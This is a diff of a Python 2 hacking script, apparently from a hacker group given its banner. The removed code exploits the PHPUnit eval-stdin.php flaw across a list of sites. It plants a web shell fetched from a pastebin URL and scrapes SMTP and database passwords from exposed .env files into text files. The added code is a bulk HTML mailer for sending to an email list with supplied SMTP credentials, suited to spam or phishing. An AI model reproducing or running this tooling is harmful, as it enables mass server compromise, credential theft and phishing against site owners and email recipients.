@@ -1,356 +1,130 @@
-import requests as r
-import sys
-import os
-from platform import system
-import threading
-import requests
-import random
-import datetime
-import re
-from multiprocessing import Pool
-from multiprocessing.dummy import Pool as ThreadPool
-from time import time as timer
+#!/usr/bin/env python
 
-if system() == 'Linux':
-    os.system('clear')
-if system() == 'Windows':
-    os.system('cls')
+# -*- coding: utf-8 -*-
 
-def rce(url):
+import smtplib
+
+from email.MIMEMultipart import MIMEMultipart
+
+from email.MIMEText import MIMEText
+
+def checkConnection(server, port, tls, user, passwd):
+
     try:
-        cekos = '<?php echo php_uname("a"); ?>'
-        upshell = '<?php system("wget https://pastebin.com/raw/DWAYZwk5 -O unit.php"); ?>'
-        url = url.strip()
-        cek = r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=cekos)
-        if 'Linux' in cek.text:
-            print "[os] " + cek.text
-            open('phpunitvuln.txt', 'a').write(cek.text+'\n'+url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'+'\n')
-            r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=upshell)
-            cekshell = r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/unit.php?ngacengan_su')
-            if 'IDBTE4M' in cekshell.text:
-                print "[Shell Uploaded] " + url+'/vendor/phpunit/phpunit/src/Util/PHP/unit.php?ngacengan_su'
-                open('shell_phpunit.txt', 'a').write(cek.text+'\n'+url+'/vendor/phpunit/phpunit/src/Util/PHP/unit.php?ngacengan_su'+'\n')
-            else:
-                print "[Shell not Uploaded]   : " + cekshell
-        else:
-            print "[Not Vuln]  : " + url
-    except:
-        pass
+
+        connect = smtplib.SMTP(server, port)
+
+        connect.ehlo()
+
+        if tls:
+
+          connect.starttls()
+
+          connect.ehlo()
+
+        connect.login(user, passwd)
         
-def rce2(url):
-    try:
-        cekos = '<?php echo php_uname("a"); ?>'
-        upshell = '<?php fwrite(fopen("raimu.php","w+"),file_get_contents("https://pastebin.com/raw/DWAYZwk5")); ?>'
-        url = url.strip()
-        cek = r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=cekos)
-        if 'Linux' in cek.text:
-            print "[os] " + cek.text
-            open('phpunitvuln.txt', 'a').write(cek.text+'\n'+url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'+'\n')
-            r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=upshell)
-            cekshell = r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/raimu.php?ngacengan_su')
-            if 'IDBTE4M' in cekshell.text:
-                print "[Shell Uploaded] " + url+'/vendor/phpunit/phpunit/src/Util/PHP/raimu.php?ngacengan_su'
-                open('shell_phpunit2.txt', 'a').write(cek.text+'\n'+url+'/vendor/phpunit/phpunit/src/Util/PHP/raimu.php?ngacengan_su'+'\n')
-            else:
-                print "[Shell not Uploaded]  : " + url
-        else:
-            print "[Not Vuln]  : " + url
+        return connect
+
     except:
-        pass
+
+        return False
+
+def inboxEmail(server, port, tls, user, passwd, maillist, From, subject, mailtext):
+
+    smtpConnect = checkConnection(server, port, tls, user, passwd)
+
+    emails = len(maillist)
+
+    for success, sendto in enumerate(maillist):
+
+        content = MIMEMultipart()
+
+        content['From'] = From
+
+        content['To'] = sendto.rstrip()
+
+        content['Subject'] = subject
+
+        htmlscript = mailtext.rstrip()
+
+        content.attach(MIMEText(htmlscript, 'html'))
+
+        print('Pr0 SMTP Email Sender >>> You are going to send to '+sendto.rstrip())
+
+        smtpConnect.sendmail(From, sendto.rstrip(), content.as_string())
+
+    smtpConnect.quit()
+
+    print('\nBastians Email Sender >>> Email to '+str(success+1)+'/'+str(emails)+' Adresses sended!\n')
+
+print"""
+
+
+     __       .__                  ________ 
+    |__|____  |  | _____    ____  /  _____/ 
+    |  \__  \ |  | \__  \  /    \/   \  ___ 
+    |  |/ __ \|  |__/ __ \|   |  \    \_\  \
+/\__|  (____  /____(____  /___|  /\______  /
+\______|    \/          \/     \/        \/ 
+
    
-def getsmtp(url):
+                                                          """
 
-	try:
-		eNv = "{}/.env".format(url)
+print('# GreeTz To : All My Friends & CLAY Members & FsocietyTN Members')
 
-		headers = {
-		    'Connection': 'keep-alive',
-		    'Cache-Control': 'max-age=0',
-		    'Upgrade-Insecure-Requests': '1',
-		    'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
-		    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-		    'Accept-Encoding': 'gzip, deflate',
-		    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-		}
+print('')
 
-		rsmTP = requests.get(eNv, headers=headers, allow_redirects=True, timeout=3)
+smtpServer = raw_input('\nPlease enter the SMTP Server (Hostname or IP Adress): ')
 
-		if "mailtrap.io" in rsmTP.text:
+smtpPort = input('Please enter the SMTP Port : ')
 
-			print("\033[1;31;40m")
+smtpTLS = input('Secure the Email with TLS ? (Yes [1] or No [0]): ')
 
-			print "[ - ] NOT FOUND SMTP [ - ] \n"
+smtpUser = raw_input('Enter the SMTP Username: ')
 
-		elif rsmTP.status_code == 200:
-			
-			if "APP_NAME" in rsmTP.text:
-				
-				open('envfound.txt', 'a').write(eNv + '\n')
+smtpPass = raw_input('Enter the SMTP Password: ')
 
-			print("\033[1;32;40m")
+if checkConnection(smtpServer, smtpPort, smtpTLS, smtpUser, smtpPass,):
 
-			if "MAIL_HOST" in rsmTP.text:
+    print('\nPr0 SMTP Email Sender >>> SMTP Status // Connected!')
 
-				SMTP = re.findall('MAIL_HOST=(.*)', rsmTP.text)
+    sendFrom = raw_input('\nEnter the Receiver: ')
 
-				PORT = re.findall('MAIL_PORT=(.*)', rsmTP.text)
+    sendSubj = raw_input('Enter the Subject: ')
 
-				USERNAME = re.findall('MAIL_USERNAME=(.*)', rsmTP.text)
+    userlist = raw_input('Enter the Path of the Email List: ')
 
-				PASSWORD = re.findall('MAIL_PASSWORD=(.*)', rsmTP.text)
-
-				MENCRYPTION = re.findall('MAIL_ENCRYPTION=(.*)', rsmTP.text)
-
-				if "smtp.mailtrap.io" in SMTP:
-
-					print("\033[1;31;40m")
-
-					print "[ - ] NOT FOUND SMTP [ - ] \n"
-
-				elif "localhost" in SMTP:
-
-					print("\033[1;31;40m")
-
-					print "[ - ] NOT FOUND SMTP [ - ] \n"
-
-				elif "null" in SMTP:
-
-					print("\033[1;31;40m")
-
-					print "[ - ] NOT FOUND SMTP [ - ] \n"
-
-				else:
-
-					print "[ + ] FOUND SMTP [ + ]"
-
-					print "\n= = = = = = = = = = = = = = = = = = = = = = = ="
-
-					print "SMTP HOST       => {}".format(SMTP[0])
-
-					print "SMTP PORT       => {}".format(PORT[0])
-
-					print "SMTP USERNAME   => {}".format(USERNAME[0])
-
-					print "SMTP PASSWORD   => {}".format(PASSWORD[0])
-
-					print "SMTP ENCRYPTION => {}".format(MENCRYPTION[0])
-
-					print "= = = = = = = = = = = = = = = = = = = = = = = ="
-
-					open('SMTP.txt', 'a').write('SMTP HOST : ' + SMTP[0] + '\nSMTP USER : ' + USERNAME[0] + '\nSMTP PASSWORD : ' + PASSWORD[0] + '\n')
-
-
-
-			elif "SMTP_HOST" in rsmTP.text:
-
-				SMTP = re.findall('SMTP_HOST=(.*)', rsmTP.text)
-
-				PORT = re.findall('SMTP_PORT=(.*)', rsmTP.text)
-
-				USERNAME = re.findall('SMTP_USERNAME=(.*)', rsmTP.text)
-
-				PASSWORD = re.findall('SMTP_PASSWORD=(.*)', rsmTP.text)
-
-				MENCRYPTION = re.findall('SMTP_ENCRYPTION=(.*)', rsmTP.text)
-
-				if "smtp.mailtrap.io" in SMTP:
-
-					print("\033[1;31;40m")
-
-					print "[ - ] NOT FOUND SMTP [ - ] \n"
-
-				elif "localhost" in SMTP:
-
-					print("\033[1;31;40m")
-
-					print "[ - ] NOT FOUND SMTP [ - ] \n"
-
-				elif "null" in SMTP:
-
-					print("\033[1;31;40m")
-
-					print "[ - ] NOT FOUND SMTP [ - ] \n"
-
-				else:
-
-					print "\n= = = = = = = = = = = = = = = = = = = = = = = ="
-
-					print "SMTP HOST       => {}".format(SMTP[0])
-
-					print "SMTP PORT       => {}".format(PORT[0])
-
-					print "SMTP USERNAME   => {}".format(USERNAME[0])
-
-					print "SMTP PASSWORD   => {}".format(PASSWORD[0])
-
-					print "SMTP ENCRYPTION => {}".format(MENCRYPTION[0])
-
-					print "= = = = = = = = = = = = = = = = = = = = = = = ="
-
-					open('SMTP.txt', 'a').write('SMTP HOST : ' + SMTP[0] + '\nSMTP USER : ' + USERNAME[0] + '\nSMTP PASSWORD : ' + PASSWORD[0] + '\n')
-
-			elif "mailtrap.io" in rsmTP.text:
-
-				print("\033[1;31;40m")
-
-				print "[ - ] NOT FOUND SMTP [ - ] \n"
-
-			elif "DB_USERNAME=root" in rsmTP.text:
-
-				ROOTU = re.findall('DB_USERNAME=(.*)', rsmTP.text)
-
-				ROOTP = re.findall('DB_PASSWORD=(.*)', rsmTP.text)
-
-				print "[ + ] Maybe you can get VPS / DATABASE [+]"
-				
-				open('VPS.txt', 'a').write('HOSTS : ' + url + '\nUSERNAME : ' + ROOTU[0] + '\nPASSWORD : ' + ROOTP[0] + '\n')
-
-		
-
-		elif rsmTP.status_code == 302:
-			
-			if "APP_NAME" in rsmTP.text:
-				
-				open('envfound.txt', 'a').write(eNv + '\n')
-
-			if "MAIL_HOST" in rsmTP.text:
-
-				SMTP = re.findall('MAIL_HOST=(.*)', rsmTP.text)
-
-				PORT = re.findall('MAIL_PORT=(.*)', rsmTP.text)
-
-				USERNAME = re.findall('MAIL_USERNAME=(.*)', rsmTP.text)
-
-				PASSWORD = re.findall('MAIL_PASSWORD=(.*)', rsmTP.text)
-
-				MENCRYPTION = re.findall('MAIL_ENCRYPTION=(.*)', rsmTP.text)
-
-				if "smtp.mailtrap.io" in SMTP:
-
-					print("\033[1;31;40m")
-
-					print "[ - ] NOT FOUND SMTP [ - ] \n"
-
-				elif "localhost" in SMTP:
-
-					print("\033[1;31;40m")
-
-					print "[ - ] NOT FOUND SMTP [ - ] \n"
-
-				elif "null" in SMTP:
-
-					print("\033[1;31;40m")
-
-					print "[ - ] NOT FOUND SMTP [ - ] \n"
-
-				else:
-
-					print "[ + ] FOUND SMTP [ + ]"
-
-					print "\n= = = = = = = = = = = = = = = = = = = = = = = ="
-
-					print "SMTP HOST       => {}".format(SMTP[0])
-
-					print "SMTP PORT       => {}".format(PORT[0])
-
-					print "SMTP USERNAME   => {}".format(USERNAME[0])
-
-					print "SMTP PASSWORD   => {}".format(PASSWORD[0])
-
-					print "SMTP ENCRYPTION => {}".format(MENCRYPTION[0])
-
-					print "= = = = = = = = = = = = = = = = = = = = = = = ="
-
-					open('SMTP.txt', 'a').write('SMTP HOST : ' + SMTP[0] + '\nSMTP USER : ' + USERNAME[0] + '\nSMTP PASSWORD : ' + PASSWORD[0] + '\n')
-					
-
-
-
-			elif "SMTP_HOST" in rsmTP.text:
-
-				SMTP = re.findall('SMTP_HOST=(.*)', rsmTP.text)
-
-				PORT = re.findall('SMTP_PORT=(.*)', rsmTP.text)
-
-				USERNAME = re.findall('SMTP_USERNAME=(.*)', rsmTP.text)
-
-				PASSWORD = re.findall('SMTP_PASSWORD=(.*)', rsmTP.text)
-
-				MENCRYPTION = re.findall('SMTP_ENCRYPTION=(.*)', rsmTP.text)
-
-				if "smtp.mailtrap.io" in SMTP:
-
-					print("\033[1;31;40m")
-
-					print "[ - ] NOT FOUND SMTP [ - ] \n"
-
-				elif "localhost" in SMTP:
-
-					print("\033[1;31;40m")
-
-					print "[ - ] NOT FOUND SMTP [ - ] \n"
-
-				elif "null" in SMTP:
-
-					print("\033[1;31;40m")
-
-					print "[ - ] NOT FOUND SMTP [ - ] \n"
-
-				else:
-
-					print "[ + ] FOUND SMTP [ + ]"
-
-					print "\n= = = = = = = = = = = = = = = = = = = = = = = ="
-
-					print "SMTP HOST       => {}".format(SMTP[0])
-
-					print "SMTP PORT       => {}".format(PORT[0])
-
-					print "SMTP USERNAME   => {}".format(USERNAME[0])
-
-					print "SMTP PASSWORD   => {}".format(PASSWORD[0])
-
-					print "SMTP ENCRYPTION => {}".format(MENCRYPTION[0])
-
-					print "= = = = = = = = = = = = = = = = = = = = = = = ="
-
-					open('SMTP.txt', 'a').write('SMTP HOST : ' + SMTP[0] + '\nSMTP PORT : ' + PORT[0] + '\nSMTP USER : ' + USERNAME[0] + '\nSMTP PASSWORD : ' + PASSWORD[0] + '\nSMTP ENCRYPTION : ' + MENCRYPTION[0] + '\n')
-
-
-			elif "DB_USERNAME=root" in rsmTP.text:
-
-				ROOTU = re.findall('DB_USERNAME=(.*)', rsmTP.text)
-
-				ROOTP = re.findall('DB_PASSWORD=(.*)', rsmTP.text)
-
-				print "[ + ] Maybe you can get VPS / DATABASE [+]"
-
-				open('VPS.txt', 'a').write('HOSTS : ' + url + '\nUSERNAME : ' + ROOTU[0] + '\nPASSWORD : ' + ROOTP[0] + '\n')
-
-		else:
-
-			print "[ - ] CAN'T FOUND BUG [ - ]"
-
-	except:
-
-		pass
-def robot(url):
-	try:
-		rce(url)
-		rce2(url)
-		getsmtp(url)
-	except:
-		pass
-		
-def main():
-    list = open(sys.argv[1], 'r').readlines()
     try:
-        ThreadPool = Pool(10)
-        ThreadPool.map(robot, list)
+
+        maillist = open(userlist).readlines()
+
+        print('\n Pr0 SMTP Email Sender >>> I found currently '+str(len(maillist))+' Email Adresses.')
+
+        htmlscript = raw_input('\nEnter here the Path to your HTML Script: ')
+
+        try:
+
+            html = open(htmlscript).read()
+
+            raw_input('ENTER, to send the HTML Script to '+str(len(maillist))+' ...\n')
+
+            try:
+
+                inboxEmail(smtpServer, smtpPort, smtpTLS, smtpUser, smtpPass, maillist, sendFrom, sendSubj, html)
+
+            except:
+
+                print('ERROR: I CANT USE THE EMAIL!')
+
+        except:
+
+            print('The HTML File cannot get readed yet or is empty.')
+
     except:
-        pass
-if __name__ == "__main__":
-    if len(sys.argv) < 2:
-        print "Usage : python " + sys.argv[0] + " list.txt"
-    else:
-        main()
+
+        print('The .txt File cannot get readed or is empty.')
+
+else:
+
+    print('I cant connect to the Server :/')
